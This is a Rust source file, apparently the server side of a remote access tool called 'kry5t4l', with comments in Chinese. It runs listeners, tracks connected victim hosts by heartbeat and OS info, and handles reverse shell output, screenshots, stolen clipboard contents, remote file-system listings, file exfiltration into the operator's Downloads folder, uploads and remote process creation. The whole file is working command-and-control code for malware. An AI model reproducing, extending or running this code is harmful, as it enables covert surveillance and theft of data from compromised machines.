use std::{collections::{hash_map, HashMap}, ffi::OsStr, fs::{self, File}, io::{Read, Write}, net::SocketAddr, path::{Path, PathBuf}, process::Command, sync::{atomic::{AtomicU8, Ordering}, Arc, Mutex}};
use lazy_static::*;
use flate2::read::{ZlibDecoder, ZlibEncoder};
use windirs::FolderId;

use kry5t4l_share::modules::{connection_manager::ServerConnector, get_known_folder_path, protocol::{get_cur_timestamp_secs, FileTransfer, Heartbeat, HostOSInfo, Message, Protocol, Serializable}, screen::ScreenFrame, CommandType};

use crate::{
    modules::monitor::handle_screenshot_data, 
    views::{clipboard::{send_clipboard_update, ClipboardUpdate}, explorer::{send_explorer_update, ExplorerUpdate}, shell::{send_shell_update, ShellUpdate}}
};


lazy_static!{
    pub static ref G_ONLINE_HOSTS: Mutex<HashMap<String, HostInfo>> = Mutex::new(HashMap::new());
    pub static ref G_LISTENERS: Mutex<HashMap<u8, ListenerWrapper>> = Mutex::new(HashMap::new());
    pub static ref G_LISTENER_ID: AtomicU8 = AtomicU8::new(0);
    pub static ref G_CLIENTS: Mutex<HashMap<String, SocketAddr>> = Mutex::new(HashMap::new());
}

#[derive(Clone, Debug)]
pub struct HostInfo {
    pub clientid: String,
    pub peer_addr: SocketAddr,
    pub protocl: Protocol,
    pub in_rate: u64,
    pub out_rate: u64,
    pub last_heartbeat: u64,
    pub info: HostOSInfo,
}

#[derive(Debug, Clone)]
pub struct Listener {
    pub id: u8,
    pub protocol: Protocol,
    pub addr: SocketAddr,
}

pub fn cb_msg(msg: Message) {
    let mut hosts = G_ONLINE_HOSTS.lock().unwrap();

    match CommandType::from(msg.command_type()) {
        CommandType::Screenshot => {
                    handle_screenshot_data(msg);

        }
        CommandType::ReverseShell => {
                    println!("ReverseShell: {}", msg.clientid());
                    let data = msg.content();
            
                    let command_result = String::from_utf8_lossy(&data);
                    println!("Received command: {}", command_result);

                    if let Some((pid_str, output)) = command_result.split_once(':') {
                        if let Ok(cmd_pid) = pid_str.parse::<u32>() {
                            if cmd_pid > 0 {
                                // 发送Shell输出更新消息
                                send_shell_update(ShellUpdate::AppendOutput { 
                                    client_id: msg.clientid(), 
                                    pid: cmd_pid, 
                                    output: output.to_string() ,
                                });
                            }
                        }
                    }
                }
        CommandType::HostOSInfo => {
                    if let hash_map::Entry::Vacant(e) = hosts.entry(msg.clientid()) {
                        e.insert(HostInfo { 
                            clientid: msg.clientid(), 
                            peer_addr: msg.peer_addr(), 
                            protocl: msg.protocl(), 
                            in_rate: 0, 
                            out_rate: msg.length() as u64, 
                            last_heartbeat: get_cur_timestamp_secs(),
                            info: HostOSInfo::from_bytes(&msg.content()).unwrap(),
                            });
                    } else {
                        let v = hosts.get_mut(&msg.clientid()).unwrap();
                        *v = HostInfo { 
                            clientid: msg.clientid(), 
                            peer_addr: msg.peer_addr(), 
                            protocl: msg.protocl(), 
                            in_rate: 0, 
                            out_rate: msg.length() as u64, 
                            last_heartbeat: get_cur_timestamp_secs(),
                            info: HostOSInfo::from_bytes(&msg.content()).unwrap(), 
                        };
                    }

                    let mut clients = G_CLIENTS.lock().unwrap();
                    clients.insert(msg.clientid(), msg.peer_addr());
                }
        CommandType::Clipboard => {
                    let data = msg.content();
                    let mut decoder = ZlibDecoder::new(&data[..]);
                    let mut clipboard_data = String::new();
                    let  _ = decoder.read_to_string(&mut clipboard_data);

                    send_clipboard_update(ClipboardUpdate {
                        client_id: msg.clientid(),
                        content: clipboard_data,
                    });
                }
        CommandType::FileSystemInfo => {
                    println!("FileSystemInfo: {}", msg.clientid());
                    let data = msg.content();

                    if let Some(ft) = FileTransfer::from_bytes(&data) {
                        if ft.status.clone() == "Success" {
                    
                            // 解压
                            let mut decoder = ZlibDecoder::new(&ft.file_data[..]);
                            let mut json_data = String::new();
                            let _ = decoder.read_to_string(&mut json_data);

                            //println!("Received file system JSON data length: {}", json_data.len());

                            send_explorer_update(ExplorerUpdate::FileSystemInfo { 
                                client_id: msg.clientid(), 
                                json_data,
                            });
                        }
                    }
                }
        CommandType::Heartbeat => {
                    //println!("Heartbeat: {}", msg.clientid());

                    if hosts.contains_key(&msg.clientid()) {
                        let v = hosts.get_mut(&msg.clientid()).unwrap();
                        v.last_heartbeat = get_cur_timestamp_secs();
                        let heartbeat = Heartbeat::from_bytes(&msg.content()).unwrap();
                        v.in_rate = heartbeat.in_rate;
                        v.out_rate = heartbeat.out_rate;
                    }
                }
        CommandType::CreateProcess => {
                    let status = msg.content();
                    let status_str = String::from_utf8(status).unwrap();
                    println!("CreateProcess: {} \nStatus: {}", msg.clientid(), status_str);

                    if let Some((_, pid_str)) = status_str.split_once(':') {
                        if let Ok(cmd_pid) = pid_str.parse::<u32>() {
                            if cmd_pid > 0 {
                                // 发送Shell PID设置消息
                                send_shell_update(ShellUpdate::SetPid { 
                                    client_id: msg.clientid(), 
                                    pid: cmd_pid, 
                                    peer_addr: msg.peer_addr(), 
                                });
                            }
                        }
                    }
                }
        CommandType::Download => {
                    println!("Download: {}", msg.clientid());

                    let data = msg.content();

                    if let Some(ft) = FileTransfer::from_bytes(&data) {
                        let path = ft.src_path.trim_end_matches(&['\\', '/'][..]);
                        let path = Path::new(path);
                        let filename = path.file_name().unwrap().to_string_lossy();
                        let dst_path = get_known_folder_path(FolderId::Downloads, &filename);
                        println!("Original destination path: {}", dst_path);

                        let new_path = generate_unique_filename(dst_path.into());
                        if ft.status.clone() == "Success" {
                            let _ = fs::write(&new_path, ft.file_data);
                        } else {
                            let _ = fs::write(&new_path, ft.status);
                        }

                        let _ = Command::new("explorer")
                            .arg(get_known_folder_path(FolderId::Downloads, ""))
                            .spawn();
                    }
            }
        CommandType::Upload => {
                    let data = msg.content();
                    let status_str = String::from_utf8(data).unwrap();
                    

                    if let Some((state, status)) = status_str.split_once(':') {
                        println!("Upload: {} \nState: {} \nStatus: {}", msg.clientid(), state, status);
                        if let Some((src_path, message)) = status.split_once('&'){
                            if state == "Success" {
                                    send_explorer_update(ExplorerUpdate::UploadResult { 
                                        client_id: msg.clientid().clone(),
                                        src_path: src_path.to_string(),
                                        success: true, 
                                        message: message.to_string(),
                                    });
                            } else {
                                    send_explorer_update(ExplorerUpdate::UploadResult { 
                                        client_id: msg.clientid().clone(),
                                        src_path: src_path.to_string(),
                                        success: false, 
                                        message: message.to_string() 
                                    });
                            }
                        }

                    }
        }
        CommandType::Unknow => todo!(),

    }
}

pub fn all_listener() -> Vec<Listener> {
    let mut ret: Vec<Listener> = vec![];
    let listeners = G_LISTENERS.lock().unwrap();

    for (&id, wrapper) in listeners.iter() {
        if let Ok(addr) = wrapper.local_addr() {
            ret.push(Listener { 
                id, 
                protocol: wrapper.protocl(), 
                addr,
            });
        }
    }

    ret
}

pub fn add_listener(protocol: &Protocol, port: u16) -> std::io::Result<u8> {
    let id = G_LISTENER_ID.load(Ordering::Relaxed);

    let server = ServerConnector::new(protocol.clone(), port, cb_msg)?;

    let wrapper = ListenerWrapper {
        inner: Arc::new(Mutex::new(server)),
    };

    G_LISTENERS.lock().unwrap()
        .insert(id, wrapper);
    G_LISTENER_ID.store(id + 1, Ordering::Relaxed);

    Ok(id)
}

pub fn remove_listener(id: u8) -> std::io::Result<()> {
    let mut listeners = G_LISTENERS.lock().unwrap();

    if let Some(wrapper) = listeners.remove(&id) {
        wrapper.close();
        Ok(())
    } else {
        Err(std::io::Error::new(std::io::ErrorKind::NotFound, "listener not found"))
    }
}

pub fn send_command_to(peer_addr: &SocketAddr, data: &[u8]) -> std::io::Result<()>{
    let listener_opt = {
        let listeners = G_LISTENERS.lock().unwrap();
        listeners.values().cloned().find(|l| l.contains_addr(peer_addr))
    };

    if let Some(listener) = listener_opt {
        listener.sendto(peer_addr,data)
    } else {
        Err(std::io::Error::new(std::io::ErrorKind::NotFound, "client not found"))
    }

}

#[derive(Clone)]
pub struct ListenerWrapper {
    inner: Arc<Mutex<ServerConnector>>,
}

impl ListenerWrapper {
    pub fn contains_addr(&self, addr: &SocketAddr) -> bool {
        self.inner.lock().unwrap().contains_addr(addr)
    }

    pub fn sendto(&self, addr: &SocketAddr, buf: &[u8]) -> std::io::Result<()> {
        let mut server = self.inner.lock().unwrap();
        server.sendto(addr, buf)
    }

    pub fn local_addr(&self) -> std::io::Result<SocketAddr> {
        self.inner.lock().unwrap().local_addr()
    }

    pub fn protocl(&self) -> Protocol {
        self.inner.lock().unwrap().protocl()
    }

    pub fn close(&self) {
        self.inner.lock().unwrap().close();
    }
}

pub fn generate_unique_filename(mut path: PathBuf) -> PathBuf {
    let original_path = path.clone();
    let mut counter = 1;
    
    while path.exists() {
        let stem = original_path.file_stem().unwrap_or(OsStr::new("file"));
        let extension = original_path.extension();
        
        let new_filename = if let Some(ext) = extension {
            format!("{}({}).{}", stem.to_string_lossy(), counter, ext.to_string_lossy())
        } else {
            format!("{}({})", stem.to_string_lossy(), counter)
        };
        
        path = original_path.with_file_name(new_filename);
        counter += 1;
    }
    
    path
}

